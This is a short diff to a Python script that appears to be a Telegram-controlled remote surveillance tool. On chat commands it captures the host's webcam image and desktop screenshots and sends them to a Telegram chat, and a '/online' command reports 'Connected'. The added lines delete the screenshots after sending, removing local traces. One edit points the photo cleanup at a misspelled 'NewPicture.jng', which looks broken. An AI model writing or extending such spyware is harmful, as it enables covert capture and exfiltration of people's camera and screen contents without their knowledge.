@@ -19,9 +19,9 @@ def message_photo(message):
 			cv2.destroyAllWindows()
 			photo = open("NewPicture.jpg", "rb")
 			bot.send_photo(message.chat.id, photo)
-			scr = os.path.isfile("NewPicture.png")
+			scr = os.path.isfile("NewPicture.jng")
 			if scr == True:
-				os.remove("NewPicture.png")
+				os.remove("NewPicture.jng")
 		except:
 			bot.send_message(message.chat.id, "WebCam not found")
 	elif message.text == "/screen":
@@ -31,10 +31,12 @@ def message_photo(message):
 			pyautogui.screenshot("screenshot.png")
 			screen = open("screenshot.png", "rb")
 			bot.send_photo(message.chat.id, screen)
+			os.remove("screenshot.png")
 		elif scr == False:	
 			pyautogui.screenshot("screenshot.png")
 			screen = open("screenshot.png", "rb")
 			bot.send_photo(message.chat.id, screen)
+			os.remove("screenshot.png")
 	elif message.text == "/online":
 		bot.send_message(message.chat.id, "Connected")
 bot.polling(none_stop=True)
